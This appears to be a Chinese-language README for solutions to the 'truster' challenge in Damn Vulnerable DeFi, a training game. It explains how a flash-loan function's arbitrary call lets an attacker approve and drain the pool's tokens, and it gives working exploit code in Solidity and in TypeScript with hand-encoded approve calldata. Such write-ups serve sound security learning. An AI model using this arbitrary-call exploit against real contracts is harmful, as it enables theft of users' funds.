# Damn Vulnerable DeFi

[Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz)解题的一些代码

环境使用的hardhat，具体可以看[文档](https://hardhat.org/hardhat-runner/docs/getting-started#overview)

准备环境
```
npm install
```

运行
```
npx hardhat test test/truster/truster.nocontract.ts
```

## [truster](https://www.damnvulnerabledefi.xyz/challenges/truster/)

truster这个题目很简单，形成漏洞的原因是`flashLoan`函数能够接收一个地址，并且在合约中有使用`functionCall`去调用传入的地址去执行传入地址的函数。
所以解题方法是调用`flashLoan`函数传入token的地址，并且构造一个调用token的approve函数将token授权给合约，完成之后就使用`transferFrom`即可将token转移给攻击者。

如果要自己写一个合约来解这个题目，可以用如下的代码
```typescript
// 构造approve给攻击合约的calldata
bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
// 调用flashLoan执行approve
TrusterLenderPool(pool).flashLoan(0, msg.sender, token, data);
IERC20(token).transferFrom(pool, msg.sender, amount);
```

大部分解题的都使用的这个方法，但是token approve的目标其实不一定需要合约账户，外部账户也是可以的，所以我们可以直接去调用`flashLoan`函数将token 
approve给自己，然后自己去调用一下transferFrom转移个自己

实现代码如下
```typescript
const attackAddress = `${player.address}`.replace('0x', '').toLowerCase();
const attackData = `0x095ea7b3000000000000000000000000${attackAddress}00000000000000000000000000000000000000000000d3c21bcecceda1000000`;
await pool.connect(player).flashLoan(0, player.address, token.address, attackData);
await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
```

其中`attackData`就是调用合约函数编码之后的值

attackData = bytes4(Keccak256(函数签名)) + approve地址(填充满32字节) + approve金额(填充满32字节)
